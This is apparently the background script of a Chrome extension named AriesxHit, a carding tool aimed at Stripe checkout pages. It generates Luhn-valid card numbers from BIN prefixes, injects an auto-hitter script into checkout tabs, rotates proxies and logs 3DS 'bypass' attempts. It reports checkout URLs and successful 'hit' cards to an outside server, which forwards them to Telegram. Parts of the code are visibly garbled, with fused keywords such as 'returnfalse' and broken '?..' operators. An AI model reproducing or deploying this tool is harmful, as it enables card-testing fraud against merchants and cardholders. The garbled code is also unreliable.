importScripts('tg-config.js');
const state= {
    'cardList':[],'binList':[],'autoHitActive':false,'logs':[],'stats': {
        'hits':0,'tested':0,'declined':0
    },
    'monitoredTabs':new Set(),'proxyList':[],'proxyIndex':0,'proxyEnabled':false,'currentCheckoutSession':null,'usedCardsInSession':new Set(),'currentMode':'cc_list','lastCheckoutUrl':null,'lastAnalyzedCheckoutUrl':null
},
API_BASE='https://aries.mikeyyfrr.me';
function isStripeCheckoutHost(_v1) {
    if(!_v1||typeof _v1!=='string')returnfalse;
    try {
        const _v2=new URL(_v1),_v3=(_v2.host||'').toLowerCase();
        if(_v3==='checkout.stripe.com')returntrue;
        if(_v3.startsWith('checkout.'))returntrue;
        returnfalse;
    }
    catch(_v4) {
        returnfalse;
    }
}
chrome.tabs.onUpdated.addListener((_v5,_v6,_v7)=> {
    const _v8=_v6.url||_v7?..url;
    if(!_v8||!isStripeCheckoutHost(_v8))return;
    try {
        fetch(API_BASE+'/api/tg/checkout-info', {
            'method':'POST','headers': {
                'Content-Type':'application/json'
            },
            'body':JSON.stringify( {
                'checkout_url':_v8
            }
            )
        }
        ).then(_v9=>_v9.json().catch(()=>( {
        }
        ))).then(_v10=> {
            if(!_v10||!_v10.ok)return;
            const _v11= {
                'merchant_url':_v10.merchant_url||_v10.business_url||'','business_name':_v10.business_name||'','amount':_v10.amount||'','amount_minor':_v10.amount_minor,'currency':_v10.currency||'','email':_v10.email||''
            };
            try {
                chrome.storage.local.set( {
                    'ariesxhit_checkout_meta':_v11
                },
                ()=> {
                }
                );
            }
            catch(_v12) {
            }
        }
        ).catch(()=> {
        }
        );
    }
    catch(_v13) {
    }
}
);
function parseProxyLine(_v14) {
    _v14=String(_v14).trim();
    if(!_v14)return null;
    const _v15=_v14.indexOf('@');
    if(_v15>0) {
        const _v16=_v14.slice(0,_v15),_v17=_v14.slice(_v15+1),_v18=_v17.split(':');
        if(_v18.length>=2) {
            const _v19=parseInt(_v18[_v18.length-1],10),_v20=_v18.slice(0,-1).join(':').trim(),_v21=_v16.indexOf(':'),_v22=_v21>=0?_v16.slice(0,_v21):_v16,_v23=_v21>=0?_v16.slice(_v21+1):'';
            return {
                'host':_v20,'port':isNaN(_v19)?8080:_v19,'user':_v22,'pass':_v23
            };
        }
    }
    const _v24=_v14.split(':');
    if(_v24.length===2) {
        const _v25=parseInt(_v24[1],10);
        return {
            'host':_v24[0].trim(),'port':isNaN(_v25)?8080:_v25
        };
    }
    if(_v24.length>=4) {
        const _v26=_v24[0].trim(),_v27=parseInt(_v24[1],10),_v28=_v24[2],_v29=_v24.slice(3).join(':');
        return {
            'host':_v26,'port':isNaN(_v27)?8080:_v27,'user':_v28,'pass':_v29
        };
    }
    return null;
}
function parseProxies(_v30) {
    if(!_v30||typeof _v30!=='string')return[];
    return _v30.split(/\r?\n/).map(parseProxyLine).filter(Boolean);
}
function applyProxy(_v31) {
    if(!_v31||!_v31.host||!chrome.proxy?..settings?..set)return;
    const _v32= {
        'mode':'fixed_servers','rules': {
            'singleProxy': {
                'scheme':'http','host':_v31.host,'port':_v31.port
            },
            'bypassList':['localhost','127.0.0.1']
        }
    };
    chrome.proxy.settings.set( {
        'value':_v32,'scope':'regular'
    },
    ()=> {
        if(chrome.runtime.lastError)console.warn('[AriesxHit]\x20Proxy\x20apply\x20failed:',chrome.runtime.lastError);
    }
    );
}
function clearProxy() {
    if(!chrome.proxy?..settings?..set)return;
    chrome.proxy.settings.set( {
        'value': {
            'mode':'system'
        },
        'scope':'regular'
    },
    ()=> {
    }
    );
}
chrome.storage.local.get(['cardList','binList','logs','stats','autoHitActive','ax_proxy','ax_proxy_enabled','ax_proxy_index'],_v33=> {
    if(_v33.cardList)state.cardList=_v33.cardList;
    if(_v33.binList)state.binList=_v33.binList;
    _v33.logs?(state.logs=_v33.logs,console.log('[AriesxHit]\x20Loaded\x20logs\x20from\x20storage:',state.logs.length,'entries')):console.log('[AriesxHit]\x20No\x20logs\x20found\x20in\x20storage');
    _v33.stats?(state.stats=_v33.stats,console.log('[AriesxHit]\x20Loaded\x20stats\x20from\x20storage:',state.stats)):(console.log('[AriesxHit]\x20No\x20stats\x20found\x20in\x20storage,\x20initializing\x20empty\x20stats'),state.stats= {
        'hits':0,'tested':0,'declined':0
    }
    );
    if(_v33.autoHitActive!==undefined)state.autoHitActive=_v33.autoHitActive;
    state.proxyList=parseProxies(_v33.ax_proxy),state.proxyEnabled=_v33.ax_proxy_enabled===true,state.proxyIndex=Math.max(0,parseInt(_v33.ax_proxy_index,10)||0)%Math.max(1,state.proxyList.length);
    if(state.proxyEnabled&&state.proxyList.length) {
        const _v34=state.proxyList[state.proxyIndex];
        if(_v34)applyProxy(_v34);
    }
    else clearProxy();
    setupWebRequest(),console.log('[AriesxHit]\x20Auto\x20Hitter\x20ready\x20-\x20logs\x20loaded:',state.logs.length,'stats:',state.stats);
}
);
function setupWebRequest() {
    const _v35=['*://*.stripe.com/*','*://*.stripe.network/*'];
    chrome.webRequest.onBeforeRequest.addListener(handleBeforeRequest, {
        'urls':_v35
    },
    .requestBody),chrome.webRequest.onCompleted.addListener(handleCompleted, {
        'urls':_v35
    }
    ),chrome.webRequest?..onAuthRequired&&chrome.webRequest.onAuthRequired.addListener((_v36,_v37)=> {
        if(!_v36.isProxy) {
            _v37( {
            }
            );
            return;
        }
        const _v38=state.proxyList[state.proxyIndex];
        if(!state.proxyEnabled||!_v38?..user) {
            _v37( {
            }
            );
            return;
        }
        const _v39=(_v36.challenger?..host||'').toLowerCase(),_v40=parseInt(_v36.challenger?..port,10),_v41=_v39===(_v38.host||'').toLowerCase()&&(isNaN(_v40)||_v40===(_v38.port||80));
        _v41?_v37( {
            'authCredentials': {
                'username':_v38.user,'password':_v38.pass||''
            }
        }
        ):_v37( {
        }
        );
    },
    {
        'urls':['<all_urls>']
    },
    .asyncBlocking);
}
function handleBeforeRequest(_v42) {
}
function handleCompleted(_v43) {
    try {
        const _v44=_v43&&_v43.url?_v43.url:'';
        if(!_v44||!isStripeCheckoutUrl(_v44))return;
        state.lastCheckoutUrl=_v44;
        try {
            chrome.storage.local.set( {
                'ax_last_checkout_url':_v44
            }
            );
        }
        catch(_v45) {
        }
        const _v46=_v43.type||'';
        if(_v46&&_v46!=='main_frame'&&_v46!=='sub_frame')return;
        if(state.lastAnalyzedCheckoutUrl===_v44)return;
        state.lastAnalyzedCheckoutUrl=_v44,triggerCheckoutAnalysis(_v44);
    }
    catch(_v47) {
        console.log('[WEBREQUEST]\x20handleCompleted\x20error:',_v47&&_v47.message?_v47.message:String(_v47));
    }
}
function triggerCheckoutAnalysis(_v48) {
    try {
        if(!_v48||!isStripeCheckoutUrl(_v48))return;
        chrome.storage.local.get(['ax_tg_id','ax_settings'],_v49=> {
            try {
                const _v50=_v49.ax_settings&&typeof _v49.ax_settings==='object'?_v49.ax_settings: {
                },
                _v51=String(_v49.ax_tg_id||'').trim(),_v52=String(_v50.telegramChatId||'').trim()||undefined;
                if(!_v51) {
                    console.log('[CHECKOUT_ANALYZE]\x20Skipping\x20auto\x20/hit:\x20no\x20tg_id\x20linked\x20yet.');
                    return;
                }
                const _v53='https://aries.mikeyyfrr.me',_v54= {
                    'tg_id':_v51,'checkout_url':_v48
                };
                if(_v52)_v54.chat_id=_v52;
                console.log('[CHECKOUT_ANALYZE]\x20Sending\x20checkout\x20to\x20backend\x20for\x20analysis:', {
                    'url':_v48,'tg_id':_v51,'chat_id':_v52||'NONE'
                }
                ),fetch(_v53+'/api/tg/hit', {
                    'method':'POST','headers': {
                        'Content-Type':'application/json'
                    },
                    'body':JSON.stringify(_v54)
                }
                ).then(_v55=> {
                    return console.log('[CHECKOUT_ANALYZE]\x20/api/tg/hit\x20status:',_v55.status,'OK:',_v55.ok),_v55.text().then(_v56=> {
                        let _v57;
                        try {
                            _v57=_v56?JSON.parse(_v56): {
                            };
                        }
                        catch(_v58) {
                            _v57= {
                                'raw':_v56
                            };
                        }
                        console.log('[CHECKOUT_ANALYZE]\x20/api/tg/hit\x20response:',_v57);
                    }
                    );
                }
                ).catch(_v59=> {
                    console.log('[CHECKOUT_ANALYZE]\x20Error\x20calling\x20/api/tg/hit:',_v59&&_v59.message?_v59.message:String(_v59));
                }
                );
            }
            catch(_v60) {
                console.log('[CHECKOUT_ANALYZE]\x20Storage\x20handling\x20error:',_v60&&_v60.message?_v60.message:String(_v60));
            }
        }
        );
    }
    catch(_v61) {
        console.log('[CHECKOUT_ANALYZE]\x20Unexpected\x20error:',_v61&&_v61.message?_v61.message:String(_v61));
    }
}
function isStripePage(_v62) {
    if(!_v62||!_v62.startsWith('http'))returnfalse;
    returntrue;
}
function isStripeCheckoutUrl(_v63) {
    if(!_v63||!_v63.startsWith('http'))returnfalse;
    const _v64=_v63.toLowerCase();
    if(_v64.includes('checkout.stripe.com')||_v64.includes('stripe.com/c/pay'))returntrue;
    if(/\/c\/pay\/|\/pay\/|checkout|billing/i.test(_v63))returntrue;
    returnfalse;
}
function getSettingsThen(_v65) {
    chrome.storage.local.get(.ax_settings,_v66=> {
        const _v67=_v66.ax_settings&&typeof _v66.ax_settings==='object'?_v66.ax_settings: {
        };
        _v65(_v67);
    }
    );
}
function injectAutoHitterIntoAllCheckoutTabs(_v68) {
    chrome.tabs.query( {
        'url':['*://*.stripe.com/*','*://*.stripe.network/*']
    },
    _v69=> {
        const _v70=(_v69||[]).filter(_v71=>_v71.id!=null&&isStripePage(_v71.url));
        _v70.forEach(_v72=> {
            injectAutoHitter(_v72.id,_v68);
        }
        );
    }
    );
}
function injectAutoHitter(_v73,_v74) {
    const _v75=state.monitoredTabs.has(_v73);
    if(_v75&&!_v74)return;
    _v74&&_v73&&getSettingsThen(_v76=> {
        chrome.tabs.sendMessage(_v73, {
            'type':'STATE_UPDATE','autoHitActive':state.autoHitActive,'cardList':state.cardList,'binList':state.binList,'settings':_v76
        }
        ).catch(()=> {
        }
        );
    }
    ),chrome.tabs.get(_v73,_v77=> {
        _v77?..url&&_v77.url.includes('checkout.stripe.com')&&_v77.url.includes('/c/pay/')&&(state.lastCheckoutUrl=_v77.url,chrome.scripting.executeScript( {
            'target': {
                'tabId':_v73
            },
            'func':()=> {
                try {
                    const _v78=new URLSearchParams(window.location.search),_v79=_v78.get('business_url');
                    _v79&&window.postMessage( {
                        '__ariesxhit__':true,'type':'aries-business-url','business_url':_v79,'url':window.location.href
                    },
                    '*');
                }
                catch(_v80) {
                }
            }
        }
        ).catch(()=> {
        }
        ));
    }
    ),chrome.scripting.executeScript( {
        'target': {
            'tabId':_v73,'allFrames':true
        },
        'func':_v81=> {
            if(document.querySelector('script[data-aries-autohit]'))return;
            const _v82=document.createElement('script');
            _v82.src=_v81,_v82.dataset.ariesAutohit='1',_v82.onload=()=>_v82.remove(),(document.head||document.documentElement).appendChild(_v82);
        },
        'args':[chrome.runtime.getURL('scripts/autohitter/core.js')]
    }
    ).then(()=> {
        state.monitoredTabs.add(_v73),getSettingsThen(_v83=> {
            setTimeout(()=> {
                chrome.tabs.sendMessage(_v73, {
                    'type':'STATE_UPDATE','autoHitActive':state.autoHitActive,'cardList':state.cardList,'binList':state.binList,'settings':_v83
                }
                ).catch(()=> {
                }
                );
            },
            150);
        }
        );
    }
    ).catch(()=> {
    }
    );
}
chrome.tabs.onUpdated.addListener((_v84,_v85,_v86)=> {
    _v86?..url&&_v86.url.includes('checkout.stripe.com')&&_v86.url.includes('/c/pay/')&&(state.lastCheckoutUrl=_v86.url,console.log('[AriesxHit]\x20Updated\x20stored\x20checkout\x20URL:',_v86.url));
    if(_v86?..url&&isStripePage(_v86.url))injectAutoHitter(_v84);
    _v85.status==='complete'&&_v86?..url&&isStripeCheckoutUrl(_v86.url)&&console.log('[AriesxHit]\x20Detected\x20new\x20checkout\x20page,\x20injecting\x20auto-hitter');
}
),chrome.tabs.onRemoved.addListener(_v87=>state.monitoredTabs.delete(_v87)),chrome.webNavigation?..onDOMContentLoaded?..addListener(_v88=> {
    if(isStripePage(_v88.url))injectAutoHitter(_v88.tabId);
},
{
    'url':[ {
        'schemes':['https','http']
    }
    ]
}
);
function broadcastToPopups(_v89) {
    chrome.runtime.sendMessage(_v89).catch(()=> {
    }
    );
}
function validateLuhn(_v90) {
    const _v91=_v90.split('').map(Number);
    let _v92=0;
    for(let _v93=0;
    _v93<_v91.length;
    _v93++) {
        let _v94=_v91[_v91.length-1-_v93];
        if(_v93%2===1) {
            _v94*=2;
            if(_v94>9)_v94-=9;
        }
        _v92+=_v94;
    }
    return _v92%10===0;
}
function fixLuhn(_v95) {
    const _v96=_v95.split('').map(Number);
    let _v97=0;
    for(let _v98=0;
    _v98<_v96.length-1;
    _v98++) {
        let _v99=_v96[_v98];
        if((_v96.length-1-_v98)%2===1) {
            _v99*=2;
            if(_v99>9)_v99-=9;
        }
        _v97+=_v99;
    }
    return _v95.slice(0,-1)+(10-_v97%10)%10;
}
function isAmexBin(_v100) {
    const _v101=String(_v100).replace(/\D/g,'');
    return _v101.startsWith('34')||_v101.startsWith('37');
}
function normalizeCardLine(_v102) {
    if(typeof _v102!=='string')return'';
    const _v103=_v102.trim().replace(/\s+/g,'|'),_v104=_v103.split('|').map(_v105=>_v105.replace(/\D/g,'')),_v106=(_v104[0]||'').replace(/\s/g,'');
    if(_v106.length<13)return'';
    const _v107=(_v104[1]||'12').slice(0,2).padStart(2,'0'),_v108=(_v104[2]||'28').slice(-2),_v109=(_v104[3]||'123').slice(0,4);
    return _v106+'|'+_v107+'|'+_v108+'|'+_v109;
}
function generateCardsFromBins(_v110) {
    const _v111=[];
    for(const _v112 of _v110) {
        const _v113=String(_v112).split('|'),_v114=_v113[0].replace(/\D/g,''),_v115=_v113[1]?_v113[1].replace(/\D/g,''):null,_v116=_v113[2]?_v113[2].replace(/\D/g,''):null,_v117=_v113[3]?_v113[3].replace(/\D/g,''):null;
        if(_v114.length<6)continue;
        const _v118=isAmexBin(_v114),_v119=_v118?15:16,_v120=_v118?4:3,_v121=5;
        for(let _v122=0;
        _v122<_v121;
        _v122++) {
            let _v123;
            if(_v114.length>=6&&_v114.length<_v119) {
                const _v124=_v114.length,_v125=_v119-_v124;
                let _v126=_v114;
                if(_v125>1) {
                    let _v127='';
                    for(let _v128=0;
                    _v128<_v125-1;
                    _v128++)_v127+=Math.floor(Math.random()*10);
                    _v127+='0',_v126+=_v127;
                }
                else _v125===1&&(_v126+='0');
                _v123=fixLuhn(_v126.slice(0,_v119));
            }
            else {
                if(_v114.length===_v119)_v123=fixLuhn(_v114);
                else {
                    const _v129=Math.min(_v114.length,_v119-1);
                    let _v130=_v114.slice(0,_v129);
                    const _v131=_v119-_v130.length;
                    if(_v131>1) {
                        let _v132='';
                        for(let _v133=0;
                        _v133<_v131-1;
                        _v133++)_v132+=Math.floor(Math.random()*10);
                        _v132+='0',_v130+=_v132;
                    }
                    else _v131===1&&(_v130+='0');
                    _v123=fixLuhn(_v130.slice(0,_v119));
                }
            }
            let _v134,_v135;
            if(_v115&&_v116) {
                _v134=_v115.padStart(2,'0');
                if(_v116.length===2) {
                    const _v136=new Date().getFullYear(),_v137=Math.floor(_v136/100)*100,_v138=parseInt(_v116);
                    _v135=_v137+_v138;
                    if(_v135<_v136)_v135+=100;
                }
                else _v135=_v116;
                _v135=String(_v135);
            }
            else {
                const _v139=new Date().getFullYear();
                _v135=_v139+Math.floor(Math.random()*6)+1,_v134=Math.floor(Math.random()*12)+1,_v134=String(_v134).padStart(2,'0'),_v135=String(_v135);
            }
            let _v140;
            _v117?_v140=_v117:_v120===4?_v140=String(Math.floor(Math.random()*9000)+1000):_v140=String(Math.floor(Math.random()*900)+100);
            const _v141=_v123+'|'+_v134+'|'+_v135+'|'+_v140;
            if(!validateLuhn(_v123)) {
                console.warn('[generateCardsFromBins]\x20Invalid\x20Luhn\x20checksum\x20for\x20card:',_v123);
                continue;
            }
            console.log('[generateCardsFromBins]\x20Generated\x20valid\x20card:',_v141),_v111.push(_v141);
        }
    }
    return _v111.length?_v111:['4242424242424242|12|28|123'];
}
function broadcastToTabs(_v142,_v143) {
    const _v144=new Set(state.monitoredTabs);
    if(_v143)_v144.add(_v143);
    _v144.forEach(_v145=> {
        chrome.tabs.sendMessage(_v145,_v142).catch(()=> {
        }
        );
    }
    );
}
let _screenshotInProgress=false;
function captureCheckoutScreenshot(_v146,_v147) {
    if(!_v146?..windowId||!chrome.tabs?..captureVisibleTab||!chrome.downloads?..download)return;
    if(_screenshotInProgress)return;
    _screenshotInProgress=true;
    const _v148=()=> {
        _screenshotInProgress=false;
    };
    setTimeout(_v148,4000);
    const _v149=new Date(),_v150=_v149.toISOString().replace(/[:.]/g,'-');
    chrome.storage.local.get(.ax_screenshot_format,_v151=> {
        const _v152=(_v151.ax_screenshot_format||'ARIESxHit_{timestamp}').trim()||'ARIESxHit_{timestamp}',_v153=_v152.replace(/\ {
            timestamp\
        }
        /gi,_v150+'Z').replace(/[<>:"/\\|?*]/g,'_'),_v154=_v153.endsWith('.png')?_v153:_v153+'.png';chrome.tabs.captureVisibleTab(_v146.windowId,{'format':'png'},_v155=>{if(chrome.runtime.lastError||!_v155)return;chrome.downloads.download({'url':_v155,'filename':_v154,'saveAs':false,'conflictAction':'uniquify'},()=>{});});});}chrome.runtime.onMessage.addListener((_v156,_v157)=>{_v156.type==='aries-business-url'&&_v156.business_url&&(state.lastBusinessUrl=_v156.business_url,console.log('[AriesxHit]\x20Stored\x20business_url:',_v156.business_url));}),chrome.runtime.onMessage.addListener((_v158,_v159,_v160)=>{switch(_v158.type){case'LOG':if(_v158.logType==='bypass'||_v158.logType==='retry'){state.logs.push({'type':'log','subtype':_v158.logType,'message':_v158.message,'url':_v158.url,'timestamp':_v158.timestamp||Date.now()});if(state.logs.length>200)state.logs.shift();chrome.storage.local.set({'logs':state.logs}),console.log('[3DS-'+_v158.logType.toUpperCase()+']\x20'+_v158.message),broadcastToPopups({'type':'LOG',..._v158}),broadcastToTabs({'type':'LOG',..._v158},_v159?..tab?..id);}  _v160({'ok':true});break;case'CARD_TRYING':if(!state._attemptStartTime)state._attemptStartTime=Date.now();state.stats.tested++,state.logs.push({'type':'log','subtype':'trying','attempt':_v158.attempt,'card':_v158.card,'mode':_v158.mode,'timestamp':Date.now()});if(state.logs.length>200)state.logs.shift();chrome.storage.local.set({'logs':state.logs,'stats':state.stats}),broadcastToPopups(_v158),broadcastToTabs(_v158,_v159?..tab?..id),broadcastToTabs({'type':'STATS_UPDATE','attempts':state.stats.tested,'hits':state.stats.hits},_v159?..tab?..id),_v160({'ok':true});break;case'CARD_ERROR':state.stats.declined++,state.logs.push({'type':'log','subtype':'error','code':_v158.code,'decline_code':_v158.decline_code,'message':_v158.message,'timestamp':Date.now()});if(state.logs.length>200)state.logs.shift();chrome.storage.local.set({'logs':state.logs,'stats':state.stats}),broadcastToPopups(_v158),broadcastToTabs(_v158,_v159?..tab?..id),broadcastToTabs({'type':'STATS_UPDATE','attempts':state.stats.tested,'hits':state.stats.hits},_v159?..tab?..id),_v160({'ok':true});break;case'CARD_HIT':{const _v161=_v159?..tab?..id;state.stats.hits++;let _v162=_v158.card;const _v163={..._v158,'card':_v162};state.logs.push({'type':'log','subtype':'hit','card':_v158.card,'timestamp':Date.now()});chrome.storage.local.set({'logs':state.logs,'stats':state.stats}),broadcastToPopups(_v163),broadcastToTabs(_v163,_v161);chrome.storage.local.get(['ax_tg_id','ax_tg_name','ax_settings','ariesxhit_checkout_meta'],_v164=>{const _v165=_v164.ax_settings||{},_v166=_v164.ariesxhit_checkout_meta||{};const _v167='https://aries.mikeyyfrr.me';const _v168=String(_v164.ax_tg_id||'').trim();const _v169={'tg_id':_v168,'card':_v162||_v158.card||'','amount':_v166.amount||_v158.amount||'','bot_token':_v165.telegramBotToken||'','chat_id':_v165.telegramChatId||''};fetch(_v167+'/api/tg/notify-hit',{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON.stringify(_v169)}).then(_v170=>_v170.json()).then(_v171=>{if(_v171&&_v171.ok)console.log('[CARD_HIT]\x20Notification\x20sent');}).catch(()=>{});});_v160({'ok':true});break;}case'GET_STATE':getSettingsThen(_v172=>{_v160({'autoHitActive':state.autoHitActive,'cardList':state.cardList,'binList':state.binList,'stats':state.stats,'settings':_v172});});returntrue;case'START_AUTO_HIT':{state.autoHitActive=true,state.stats.tested=0;let _v173=_v158.data?..cards??[];const _v174=_v158.data?..bins??[];if(Array.isArray(_v173)&&_v173.length>0)state.cardList=_v173.map(normalizeCardLine).filter(Boolean);else _v174.length>0&&(state.cardList=generateCardsFromBins(_v174),state.binList=_v174);chrome.storage.local.set({'cardList':state.cardList,'autoHitActive':true}),injectAutoHitterIntoAllCheckoutTabs(true),_v160({'ok':true,'cardList':state.cardList});break;}case'STOP_AUTO_HIT':state.autoHitActive=false,chrome.storage.local.set({'autoHitActive':false}),state.monitoredTabs.forEach(_v175=>{chrome.tabs.sendMessage(_v175,{'type':'STATE_UPDATE','autoHitActive':false}).catch(()=>{});}),_v160({'ok':true});break;case'GET_LOGS':_v160({'logs':state.logs,'stats':state.stats});break;case'CLEAR_LOGS':state.logs=[],state.stats={'hits':0,'tested':0,'declined':0},chrome.storage.local.set({'logs':state.logs,'stats':state.stats}),_v160({'ok':true});break;default:_v160({'ok':true});}returntrue;}),chrome.action.onClicked.addListener(()=>{chrome.tabs.create({'url':chrome.runtime.getURL('dashboard/index.html')});});